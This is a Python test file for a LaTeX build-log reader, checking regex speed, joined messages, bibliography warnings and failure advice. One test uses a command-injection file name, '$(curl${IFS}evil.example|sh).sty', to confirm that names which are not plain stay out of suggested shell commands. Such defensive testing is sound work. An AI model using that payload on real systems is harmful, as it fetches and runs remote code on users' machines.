"""The build log reader: linear-time rules, joined messages, new log checks and failure help.

Every rule in ``LOG_RULES`` decides in linear time, so a long adversarial line cannot stall a
build check; a package error that TeX wraps over several lines is reported whole; a rerun
request is not reported after a TeX error; the new log checks report their message and stay
quiet on a clean log; BibTeX and Biber warnings become findings; and failures that Fledge's
restrictions cause carry a specific next step.
"""

from __future__ import annotations

import re
import tempfile
import time
import unittest
from pathlib import Path

from latexprep.build_failure_help import explain_build_message
from latexprep.build_log import LOG_RULES, bibliography_log_findings, log_findings, log_messages
from latexprep.command_runner import CommandResult
from latexprep.latexmk_build import build_project
from tests.fakes import FakeBuildRunner

# A line far longer than TeX ever writes (it wraps at max_print_line), as a reviewer's
# measurement used: the slowest former pattern needed 10.8 s on it.
_LONG_LINE_CHARACTERS = 160_000
# Each rule must decide a long line well within this; linear rules need milliseconds.
_MAX_SECONDS_PER_LINE = 0.5
# The whole reader takes about 0.15 s on the long log here, and coverage tracing in CI
# makes it about ten times slower; quadratic reading of that log would take minutes.
_MAX_SECONDS_FOR_WHOLE_LOG = 10.0
# Fragments that make backtracking patterns slow when they repeat without a match: the
# prefixes of every former regular expression and the separators of located errors.
_ADVERSARIAL_FRAGMENTS = (
    "citation ",
    "reference ",
    "label ",
    "a:1: ",
    ":1: ",
    "x:",
    "! ",
    " ",
    "package x warning: ",
    "class x ",
    " warning: ",
    "please (re",
    "rerun ",
    "overfull ",
    "latex warning: ",
)
_FONTSPEC_ERROR = """\
./main.tex:4: Package fontspec Error:
(fontspec)                The font "Fira Code" cannot be found; this may be
(fontspec)                but usually is not a fontspec bug. Either there is a
(fontspec)                typo in the font name/file, the font is not
(fontspec)                installed (correctly), or there is a bug in the
(fontspec)                underlying font loading engine (XeTeX/luaotfload).
"""


class LogRuleComplexityTests(unittest.TestCase):
    """Every log rule, and the joining of continuation lines, takes linear time."""

    def test_every_rule_decides_a_long_adversarial_line_quickly(self) -> None:
        for rule in LOG_RULES:
            for fragment in _ADVERSARIAL_FRAGMENTS:
                line = (fragment * (_LONG_LINE_CHARACTERS // len(fragment) + 1))[
                    :_LONG_LINE_CHARACTERS
                ]
                with self.subTest(rule=rule.rule, fragment=fragment):
                    started = time.perf_counter()
                    rule.matches(line)
                    self.assertLess(time.perf_counter() - started, _MAX_SECONDS_PER_LINE)

    def test_long_line_through_the_whole_reader_is_quick(self) -> None:
        log = "Citation " * 20_000 + "\n" + " continuation\n" * 20_000
        started = time.perf_counter()
        log_findings(log, "main.tex")
        self.assertLess(time.perf_counter() - started, _MAX_SECONDS_FOR_WHOLE_LOG)


class LogMessageTests(unittest.TestCase):
    """Wrapped messages are joined whole, and a rerun request does not follow a TeX error."""

    def test_wrapped_package_error_is_reported_whole_without_package_prefixes(self) -> None:
        findings = log_findings(_FONTSPEC_ERROR, "main.tex")
        error = next(item for item in findings if item.code == "BLD009")
        self.assertIn(
            'The font "Fira Code" cannot be found; this may be but usually', error.message
        )
        self.assertIn("(XeTeX/luaotfload).", error.message)
        self.assertNotIn("(fontspec)", error.message)
        self.assertEqual((error.path, error.line), ("main.tex", 4))

    def test_joining_stops_at_a_line_that_does_not_continue(self) -> None:
        messages = list(log_messages("first\n  second\nthird\n"))
        self.assertEqual(messages, ["first second", "second", "third"])

    def test_joining_is_bounded(self) -> None:
        log = "start\n" + "".join(f"  part {number}\n" for number in range(100))
        first = next(iter(log_messages(log)))
        self.assertEqual(first, "start " + " ".join(f"part {number}" for number in range(12)))

    def test_rerun_request_is_not_reported_after_a_tex_error(self) -> None:
        log = "! Undefined control sequence.\nLaTeX Warning: Label(s) may have changed.\n"
        self.assertEqual([item.code for item in log_findings(log, "main.tex")], ["BLD009"])
        alone = log_findings("LaTeX Warning: Label(s) may have changed.\n", "main.tex")
        self.assertEqual([item.code for item in alone], ["BLD008"])


class NewLogRuleTests(unittest.TestCase):
    """Unused class options, oversized floats, PDF-string tokens and obsolete packages."""

    def test_each_rule_reports_its_message(self) -> None:
        cases = (
            ("BLD011", "warning", "LaTeX Warning: Unused global option(s):\n    [twocolumns]."),
            (
                "BLD012",
                "warning",
                "LaTeX Warning: Float too large for page by 52.3pt on input line 9.",
            ),
            (
                "BLD013",
                "info",
                "Package hyperref Warning: Token not allowed in a PDF string (Unicode):\n"
                "(hyperref)                removing `math shift' on input line 12.",
            ),
            (
                "BLD014",
                "info",
                "Package fixltx2e Warning: fixltx2e is not required with releases after 2015\n"
                "(fixltx2e)                All fixes are now in the LaTeX kernel.",
            ),
            ("BLD014", "info", "Class scrartcl Warning: Usage of deprecated font command `\\bf'!"),
        )
        for code, severity, log in cases:
            with self.subTest(code=code, log=log):
                findings = log_findings(log, "main.tex")
                self.assertEqual(
                    [(item.code, item.severity) for item in findings], [(code, severity)]
                )
        option = log_findings(cases[0][2], "main.tex")[0]
        self.assertIn("[twocolumns]", option.message)
        self.assertEqual(log_findings(cases[1][2], "main.tex")[0].details["input_line"], 9)

    def test_clean_log_reports_none_of_the_new_rules(self) -> None:
        log = (
            "LaTeX Warning: You have requested package `x', but the package provides `y'.\n"
            "Package hyperref Warning: Option `pdfauthor' has already been used.\n"
            "Package caption Info: Begin \\AtBeginDocument code.\n"
            "(see the transcript file for additional information)\n"
            "Output written on main.pdf (3 pages, 52000 bytes).\n"
        )
        new_codes = {"BLD011", "BLD012", "BLD013", "BLD014"}
        self.assertFalse(new_codes & {item.code for item in log_findings(log, "main.tex")})


class BibliographyLogTests(unittest.IsolatedAsyncioTestCase):
    """BibTeX and Biber warnings from the ``.blg`` log become findings."""

    async def test_bibtex_and_biber_warnings(self) -> None:
        bibtex = (
            "This is BibTeX, Version 0.99e (TeX Live 2026)\n"
            "Warning--empty journal in knuth1984\n"
            'Warning--entry type for "x" isn\'t style-file defined\n'
            "--line 4 of file refs.bib\n"
            "Warning--empty journal in knuth1984\n"
            "(There were 3 warnings)\n"
        )
        findings = bibliography_log_findings(bibtex, "main.tex")
        self.assertEqual([item.code for item in findings], ["BLD015", "BLD015"])
        # BibTeX notes a missing field in nearly every bibliography: information only.
        self.assertEqual({item.severity for item in findings}, {"info"})
        self.assertEqual(
            findings[0].message, "The bibliography tool warned: empty journal in knuth1984"
        )
        self.assertIn("line 4 of file refs.bib", findings[1].message)
        biber = (
            "[0] Config.pm:308> INFO - This is Biber 2.22\n"
            "[57] Biber.pm:4140> WARN - Duplicate entry key 'x' in file 'refs.bib', skipping\n"
            "[90] Biber.pm:131> INFO - WARNINGS: 1\n"
        )
        [warning] = bibliography_log_findings(biber, "main.tex")
        self.assertEqual(
            (warning.code, warning.severity, warning.path), ("BLD015", "info", "main.tex")
        )
        self.assertIn("Duplicate entry key 'x'", warning.message)

    async def test_clean_logs_and_many_warnings(self) -> None:
        self.assertEqual(bibliography_log_findings("", "main.tex"), [])
        self.assertEqual(
            bibliography_log_findings("[0] Config.pm:308> INFO - This is Biber 2.22\n", "main.tex"),
            [],
        )
        many = "".join(f"Warning--empty journal in key{number}\n" for number in range(25))
        findings = bibliography_log_findings(many, "main.tex")
        self.assertEqual(len(findings), 21)
        self.assertEqual({item.severity for item in findings}, {"info"})
        self.assertIn("5 more warnings", findings[-1].message)

    async def test_many_distinct_warnings_are_counted_in_linear_time(self) -> None:
        # Looking each warning up in a list took 14 s for 80,000 distinct warnings.
        count = 80_000
        log = "".join(f"Warning--empty journal in key{number}\n" for number in range(count))
        # A warning longer than a finding shows is still recognised when it repeats.
        long_warning = "Warning--" + "x" * 3000 + "\n"
        started = time.perf_counter()
        findings = bibliography_log_findings(long_warning + log + long_warning, "main.tex")
        self.assertLess(time.perf_counter() - started, 2.0)
        self.assertIn(f"wrote {count + 1 - 20} more warnings", findings[-1].message)

    async def test_build_reports_the_warnings_of_its_blg(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "source"
            source.mkdir()
            (source / "main.tex").write_text("source content")
            result = await build_project(
                source, "main.tex", root / "build", "pdflatex", _BlgWritingRunner()
            )
        self.assertIn("BLD015", {item.code for item in result.findings})


class _BlgWritingRunner(FakeBuildRunner):
    """A faked latexmk that also leaves a BibTeX log with one warning."""

    async def run(
        self, argv: list[str], cwd: Path, workspace: Path, **options: object
    ) -> CommandResult:
        """Write the outputs of :class:`FakeBuildRunner` and a ``.blg`` beside them.

        The arguments are those of :meth:`FakeBuildRunner.run`.
        """
        result = await super().run(argv, cwd, workspace)
        if argv[-1] not in {"-v", "--version"}:
            (workspace / "output" / "main.blg").write_text("Warning--empty journal in knuth1984\n")
        return result


class FailureHelpTests(unittest.IsolatedAsyncioTestCase):
    """Failures caused by Fledge's restrictions get a specific next step."""

    def test_each_restriction_is_explained(self) -> None:
        cases = (
            (
                "fontspec.sty:100: Fatal Package fontspec Error: The fontspec package requires "
                "either XeTeX or LuaTeX.",
                "% !TEX program = xelatex",
            ),
            # Packages bound to one engine, as pdfLaTeX reports them (TeX Live 2026).
            (
                "! Fatal Package bidi Error: Oops! can not use pdftex. The bidi package "
                "requires XeTeX.",
                "needs XeLaTeX, but",
            ),
            (
                "! Critical Package xeCJK Error: The xeCJK package requires XeTeX to function.",
                "--engine xelatex",
            ),
            (
                "! Package luatexja-core Error: This package requires Lua(HB)(La)TeX.",
                "% !TEX program = lualatex",
            ),
            (
                "! Package luacode Error: LuaTeX is required for this package. Aborting..",
                'engine = "lualatex"',
            ),
            (
                "! Critical Package ctex Error: CTeX fontset `mac' is unavailable in current mode.",
                "% !TEX program = xelatex` (or lualatex)",
            ),
            ("! LaTeX Error: File `acmart-custom.cls' not found.", "tlmgr search --global --file"),
            ("! LaTeX Error: File `acmart-custom.cls' not found.", "TEXMFHOME"),
            (
                "!pdfTeX error: pdflatex (file tcrm1000): Font tcrm1000 at 600 not found",
                "cm-super",
            ),
            (
                "./main.tex:8: Package minted Error: Missing definition for highlighting style "
                '"default" (minted executable is unavailable or disabled)',
                "_minted folder",
            ),
            (
                "./main.tex:5: Package svg Error: File `diagram_svg-tex.pdf' is missing.",
                "rsvg-convert",
            ),
            (_FONTSPEC_ERROR.replace("\n(fontspec)", " "), "~/Library/Fonts"),
            (
                "./main.tex:5: Package pdftex.def Error: "
                "File `plot-eps-converted-to.pdf' not found",
                "epstopdf figure.eps",
            ),
            (
                "xdvipdfmx:warning: Filtering file via command -->rungs -q -dSAFER ... failed.",
                "Ghostscript",
            ),
        )
        for message, expected in cases:
            with self.subTest(message=message[:40]):
                self.assertIn(expected, explain_build_message(message) or "")

    def test_ordinary_errors_get_no_restriction_advice(self) -> None:
        for message in (
            "! Undefined control sequence.",
            "! LaTeX Error: File `figure.png' not found.",
            "! Missing $ inserted.",
            # An engine named without the wording of a package that refuses to run.
            "! Package fontenc Error: Encoding TU is meant for XeTeX and LuaTeX.",
            "! Package ctex Error: CTeX fontset `fandol' is used.",
        ):
            with self.subTest(message=message):
                self.assertIsNone(explain_build_message(message))

    def test_only_plain_file_names_from_the_log_reach_a_command_to_copy(self) -> None:
        plain = explain_build_message("! LaTeX Error: File `my_style-2.0+x.sty' not found.")
        self.assertIn("`tlmgr search --global --file /my_style-2.0+x.sty`", plain or "")
        self.assertIn("`apt-file search my_style-2.0+x.sty`", plain or "")
        # A document can print any such message with \typeout, so a name that is not plain
        # stays out of every command, and the advice describes the search instead.
        for name in (
            "$(curl${IFS}evil.example|sh).sty",
            "a;b.sty",
            "naïve.sty",
            "x" * 101 + ".sty",
        ):
            with self.subTest(name=name[:20]):
                advice = explain_build_message(f"! LaTeX Error: File `{name}' not found.") or ""
                self.assertIn("tlmgr's file search", advice)
                commands = re.findall(r"`([^`]*)`", advice)
                self.assertEqual(commands, ["sudo tlmgr install <package>"])

    def test_log_findings_carry_the_next_step(self) -> None:
        findings = log_findings(
            "!pdfTeX error: pdflatex (file bbm10): Font bbm10 at 600 not found\n"
            " ==> Fatal error occurred, no output PDF file produced!\n",
            "main.tex",
        )
        self.assertIn("bitmap fonts", findings[0].suggestion or "")

    async def test_xelatex_eps_failure_explains_the_blocked_converter(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "source"
            source.mkdir()
            (source / "main.tex").write_text("source content")
            result = await build_project(
                source, "main.tex", root / "build", "xelatex", _DriverFailureRunner(returncode=12)
            )
        failed = next(item for item in result.findings if item.rule == "build.failed")
        self.assertIn("Ghostscript", failed.suggestion or "")


class _DriverFailureRunner(FakeBuildRunner):
    """A faked latexmk whose XeLaTeX driver could not convert an EPS figure."""

    async def run(
        self, argv: list[str], cwd: Path, workspace: Path, **options: object
    ) -> CommandResult:
        """Return the result of :class:`FakeBuildRunner` with xdvipdfmx's failure on stderr.

        The arguments are those of :meth:`FakeBuildRunner.run`.
        """
        result = await super().run(argv, cwd, workspace)
        if argv[-1] in {"-v", "--version"}:
            return result
        stderr = (
            "xdvipdfmx:warning: Filtering file via command -->rungs -q -dSAFER '-- ./plot.eps'"
            "<-- failed.\nxdvipdfmx:fatal: pdf_link_obj(): passed invalid object.\n"
        )
        return CommandResult(result.returncode, "", stderr, resolved_command=argv)
